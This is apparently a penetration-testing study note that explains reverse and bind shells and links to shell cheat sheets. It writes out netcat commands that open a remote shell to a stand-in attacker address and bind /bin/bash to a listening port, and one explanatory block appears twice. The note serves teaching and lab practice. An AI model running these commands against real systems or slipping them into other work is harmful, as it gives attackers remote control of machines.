# Reverse and bind shells

**Reverse Shell** and **Bind Shell** are two common techniques used in remote command execution, typically in the context of penetration testing or exploiting systems. Here's a breakdown of the differences between the two:

#### **Reverse Shell:**

* **Initiation**: In a reverse shell, the _target machine_ initiates the connection to the _attacker's machine_.
* **How it works**: The attacker sets up a listener on their machine, waiting for a connection from the target machine. Once the target connects back to the attacker, the attacker can execute commands on the target machine.
* **Usage**: Reverse shells are often used when the target machine is behind a firewall or NAT (Network Address Translation) that blocks incoming connections, but allows outbound connections. This makes it easier for the attacker to bypass firewalls and other security measures.
*   **Example**:

    * **Attacker's Machine**: `nc -lvnp 4444` (sets up a listener on port 4444)
    *   **Target Machine**: `nc [attacker_ip] 4444 -e /bin/bash` (connects back to the attacker's machine, providing a shell)\
        \


        Here’s what happens:

        * The victim's machine connects to the attacker’s machine on port 4444.
        * Once the connection is established, the victim’s machine executes `/bin/bash`, and the shell input/output is redirected to the attacker’s machine.
        * The attacker now has a command-line interface on the victim's machine.



#### **Bind Shell:**

* **Initiation**: In a bind shell, the _target machine_ listens on a specific port and waits for the attacker to connect.
* **How it works**: The attacker connects directly to the target machine's open port, and once connected, they can execute commands on the target machine.
* **Usage**: Bind shells are more straightforward but are often blocked by firewalls since they require the target machine to have an open port that the attacker can connect to. This makes them less common when dealing with systems behind firewalls.
* **Example**:
  * **Target Machine**: `nc -lvnp 4444 -e /bin/bash` (listens on port 4444, executing `/bin/bash` for any incoming connection)
  * **Attacker's Machine**: `nc [target_ip] 4444` (connects to the target machine's open port)

\
Here’s what happens:

* The victim’s machine listens on port 4444.
* When the attacker connects to this port, the victim’s machine executes `/bin/bash`, giving the attacker access to a shell on the victim’s system.

Here’s what happens:

* The victim’s machine listens on port 4444.
* When the attacker connects to this port, the victim’s machine executes `/bin/bash`, giving the attacker access to a shell on the victim’s system.

#### **Key Differences:**

1. **Connection Initiation**:
   * **Reverse Shell**: The target machine initiates the connection.
   * **Bind Shell**: The attacker initiates the connection.
2. **Firewall/NAT Traversal**:
   * **Reverse Shell**: Better for bypassing firewalls since it utilizes outbound connections.
   * **Bind Shell**: May be blocked by firewalls that restrict incoming connections.
3. **Ease of Detection**:
   * **Reverse Shell**: Can be harder to detect in environments where outbound connections are less scrutinized.
   * **Bind Shell**: Easier to detect because it requires an open port on the target machine.



[https://tryhackme.com/r/room/introtoshells](https://tryhackme.com/r/room/introtoshells)

####

#### [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### [https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

#### [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

####
